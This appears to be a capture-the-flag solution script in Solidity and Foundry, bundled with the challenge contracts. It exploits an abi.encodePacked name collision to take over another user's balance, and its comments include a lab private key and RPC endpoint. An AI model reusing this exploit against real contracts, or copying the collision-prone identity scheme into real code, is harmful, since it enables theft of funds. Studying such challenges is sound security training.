// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Script, console} from "forge-std/Script.sol";

contract Solution is Script {
    Setup public setup = Setup(0x21551F9e4C73d9366a62BC37eC58dFc825cf9071);
    address wallet = 0x7e8a8bf7e51b93b5f384538a5a454d336B858937;
    Singularity public target = setup.singular();

    function setUp() public {}

    function run() public {
        vm.startBroadcast(0x731d62f665047760dce40c15cf901fab25118071b4177361c5f3a576f8715cf6);

        target.register{value: 1}("Huber", "tGallanghar");
        target.withdraw("Huber", "tGallanghar", 20 ether + 1);
        console.log(setup.isSolved());

        vm.stopBroadcast();
    }
}

// UUID	34f77c4c-6a6a-4072-b73a-467438c9fded
// RPC Endpoint	http://103.178.153.113:40010/34f77c4c-6a6a-4072-b73a-467438c9fded
// Private Key	0x731d62f665047760dce40c15cf901fab25118071b4177361c5f3a576f8715cf6
// Setup Contract	0x21551F9e4C73d9366a62BC37eC58dFc825cf9071
// Wallet	0x7e8a8bf7e51b93b5f384538a5a454d336B858937


contract Setup{
    Singularity public singular;

    constructor() payable{
        singular = new Singularity();
        singular.register{value: 20 ether}("Hubert", "Gallanghar");
    }

    function isSolved() public view returns(bool){
        return singular.checkBalance("Hubert", "Gallanghar") == 0;
    }

}

contract Singularity{

    mapping(bytes=>uint256) public balanceOf;
    mapping(string=>mapping(string=>address)) public Member;

    constructor() {}

    function getIdentity(string memory _firstName, string memory _lastName) public pure returns(bytes memory){
        return abi.encodePacked(_firstName, _lastName);
    }

    function register(string memory _firstName, string memory _lastName) public payable{
        require(Member[_firstName][_lastName] == address(0), "Already Registered");
        require(msg.value > 0);
        bytes memory code = getIdentity(_firstName, _lastName);
        balanceOf[code] += msg.value;
        Member[_firstName][_lastName] = msg.sender;
    }

    function withdraw(string memory _firstName, string memory _lastName, uint256 _amount) public{
        require(Member[_firstName][_lastName] == msg.sender, "You cannot withraw other people money!");
        bytes memory code = getIdentity(_firstName, _lastName);
        require(balanceOf[code] - _amount >= 0, "You don't have this kind of money!");
        balanceOf[code] -= _amount;
    }   

    function checkBalance(string memory _firstName, string memory _lastName) public view returns(uint256){
        bytes memory code = getIdentity(_firstName, _lastName);
        return balanceOf[code];
    }
}